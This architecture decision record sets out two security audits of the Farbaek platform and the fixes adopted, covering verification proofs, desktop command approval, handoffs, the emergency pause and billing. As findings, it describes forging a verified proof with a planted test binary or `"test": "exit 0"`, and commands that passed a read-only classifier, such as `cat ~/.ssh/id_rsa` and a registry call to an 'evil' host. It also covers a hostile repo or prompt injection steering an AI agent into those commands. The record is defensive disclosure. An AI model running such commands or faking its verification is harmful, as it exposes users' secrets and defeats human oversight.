# ADR 0175: What two security audits found

- Status: accepted (2026-11-05).
- Changes ADR 0062 (who can record a verification ProofPack), the Controlled mode of ADR 0023's permission engine (commands on someone's own computer), ADR 0139 (handoffs) and ADR 0045 (custom domains). Extends ADR 0083 (the emergency pause), ADR 0087 (permissions per person), ADR 0092 (workflows) and ADR 0107 (the app's CSP).

## Context

The owner asked for the platform's security to be checked and set up. Production was probed from outside with read-only requests, and two independent reviewers read the code: one for who can reach what, one for hostile input.

The outside held up. Row level security is on for all 94 tables, no route reads across workspaces, and no XSS sink, SQL or shell injection or SSRF route turned up. Webhook signatures are checked on the raw body, production's headers are good, and no live key was found in the repo or its history.

The real problems were inside a workspace and on the desktop. They mattered because Farbaek promises two things: a person stays in control, and its proof can be trusted. Both had holes.

## Decision

**A verified ProofPack only comes from a test space nobody could change.**
- A member could open a test space linked to a task, plant a fake `node_modules/.bin/test`, and run the checks. Only the change's own files were hashed, so they matched, and Farbaek signed a verified ProofPack. The task moved to Verified, publishing stopped asking an owner, and GitHub's status went green.
- `sandbox_sessions.purpose` is now `person` or `verification`. It's set by `app_reserve_sandbox_for_verification` before a sandbox exists, so there's no moment to reach in first.
- Only a `verification` session can record a ProofPack or move a task. Nobody can write files or run commands in one, and only the verification runner can ask for its checks.
- Checks a person runs in their own test space still run and record a receipt, marked unverified, with a line saying a person could have changed that space.
- That closed the test space, but the checks run on the whole project, and only the change's own files are hashed. A member could edit `package.json` to `"test": "exit 0"` in the file editor, with no review, and verify. So when a project file changed after the change went in, the same rule publishing uses (`launchEvidence`), passing checks don't verify it. Failing ones still count, so the task can move on and be fixed. The page says why and offers a new task or an undo.
- Because a by-hand test space can't verify any more, the task page stopped sending people to one to install something first. A `pyproject.toml` that declares a project now gets installed in the fresh test space, and anything else a project needs first can be a check in its plan, before the tests.
- A cloud run's own check after applying also uses a fresh test space, because a prompt-injected agent could have tampered with the one it worked in. This costs a little more test space time.

**Nothing runs on someone's own computer without them.**
- Controlled Development ran commands classed read-only with no approval. The classifier looks at the program and its first argument, so `cat ~/.ssh/id_rsa`, `npm view x --registry=https://evil…` and `git log --output=…` all passed, and a hostile repo could steer the agent into them.
- Fixing the classifier would be a losing game: arguments, config files and aliases can turn any "read" into something else. So every command on a person's own computer now asks. The agent has its own tools for reading files, so this costs little. In a verified test space nothing changes.
- An MCP approval showed 300 characters of its input while saying "this exact command only". It now shows all of it, in a box that scrolls.
- A folder is screened in any case, because on Windows and macOS `.GIT` is the real `.git`.

**A handoff only goes to the person's own computer, and only with known checks.**
- A member could queue code to run on the owner's computer, and the card said "you sent" it. The server now accepts only a computer the person paired themselves, which also makes that sentence true, so the card needs no "who asked" line. Open handoffs to someone else's computer are withdrawn by the migration.
- A plan's checks can be anything, so only commands known to be a test or a build run there (`checkForComputer`). Anything else is skipped with its reason and the rest still run, so one unusual check doesn't stop a whole task. What's classed read-only doesn't go either, because what it prints returns to the workspace. Code given on the command line (`node -e`, `python -c`, `python -m pip`) doesn't run, and `npx` gets `--no-install`, so it can't download anything. A task with nothing left to run isn't sent.
- This is a filter, not a boundary. The checks run the project's own code on that computer, so the card says that plainly, lists them, and nothing happens until the person starts it.
- Setup on a computer uses `--ignore-pnpmfile` and `--only-binary :all:`, so a package's own code doesn't run during the install. It doesn't install the project itself into someone's Python.

**The brakes reach everything.**
- The emergency pause and a suspension only refused an agent's changes. It could keep spending AI and reading files. `app_agent_session` now returns both facts, and `agentStopped` refuses every gateway route except saying who it is and unpairing.
- Withholding "Start agent runs" now covers pairing a computer and its model calls.
- A workflow runs as the person who approved it, but nothing checked that the steps were still the ones approved. A member could change a later step's plan and run it as the owner. `advanceWorkflow` now compares `workflowHash` with the stored hash before claiming a step, and stops the workflow on a mismatch. Only a draft can be approved, so the reason it gives is to make a new workflow.

**Nobody steers someone else's subscription.**
- A subscription's metadata chose its workspace, and a buyer can set metadata on a public checkout link.
- The webhook now trusts the existing mapping first. Otherwise it accepts the metadata's workspace only if an owner or admin started a checkout for that workspace and product in the last 48 hours and it has no live subscription (`app_billing_checkout_claimable`), so a checkout can't be replayed to overwrite one. A first activation that arrives later than that fails visibly on the event, where staff can see it. A late event for a subscription that has ended ends quietly.

**Smaller gaps.**
- A domain's actions need the publish permission, in TypeScript and SQL.
- A domain can't be squatted: uniqueness now applies only to verified domains, a request lasts a week from its last check, and whoever proves it first holds it.
- Deleting an account can't erase a workspace that's suspended or holds a blocked site.
- Removing a member, or a person deleting their account, revokes their computers and ends their open invitations. Changing a computer's access checks membership. Computers of people who already left are revoked by the migration.
- An account's export only reads workspaces the person is still in.
- Renaming a workspace and changing or removing a member respect a suspended workspace. Someone can still leave.
- A bearer token on the developer API needs the plan that sells it (Lite and up). The Test space page keeps working on every plan.

**Hostile input and cost.**
- Secret screening also catches `AIza`, `whsec_`, `glpat-`, `npm_` and Farbaek's own `fa_` tokens.
- A zip counts everything it inflates, good or not, and refuses entries sharing one stream. A 5 MB file could cost about 1.5 GB of work.
- At most five trials a day start from one email domain, except the big public providers, where each address is one person. Over that, the workspace starts on Free and Billing says why.
- Pairing checks one source's limit first, so junk from it can't use up the shared limit and lock everyone out.
- `/sign-in`, `/auth/connect` and `/invite/*` get the nonce CSP, report-only, because a mistake there would stop anyone signing in. It gets enforced once production's reports are clean.
- `sites` is a reserved site name. `/sign-in?error=constructor` no longer errors. HSTS `includeSubDomains` is only on Farbaek's own host, because it was also reaching people's custom domains and locking their other hosts to https.

**No rule set whose hash is its version changed**, so no rules version moves. The words a rule explains itself with (`why`) aren't hashed.

## What's left, and why

- **Edits made before a change is applied.** A member can edit a file in the project, then have a change applied, and the checks run on that. The edit is in the file's history, and it's the same as editing a repo's tests before CI runs. Requiring review of direct edits would be a different product decision.
- **A test space kept for checking shows its controls** while it runs, for the few minutes it lives. They refuse with the honest reason.
- **Store sandbox purchases grant real plans.** Not reachable while `APPLE_IAP` is off. They can't simply be refused, because Apple's reviewers test purchases in the sandbox, so the rule depends on the in-app purchase decision. It's a must-do on that checklist before switching it on.
- **`farbaek.si` on the Public Suffix List** needs a DNS record only the owner can add.
- **Auth's own limits behind the proxy** need checking on the server.
- **Phone sign-in over a custom scheme** moves to verified https links with the next iPhone release.
- **A desktop app running on the person's own model key** talks to the provider directly, so the pause can't stop those calls. It can't reach the workspace's files or suggest changes while paused.
- **Existing desktop installs** keep the old command rule until they update. The server-side refusals reach them straight away.

## Consequences

- A person's Test space checks no longer verify a task. They say so, and say where to verify it.
- Editing a file between applying a change and checking it means that change can't reach Verified. Publishing already asked in that case, so this is the same rule in one more place.
- Controlled Development asks more often. That's the point, and it's the honest reading of its name.
- Each applied change in a cloud run starts one more test space.
- A real purchase couldn't be run here, so the owner's next real checkout is the live test of the subscription rule.
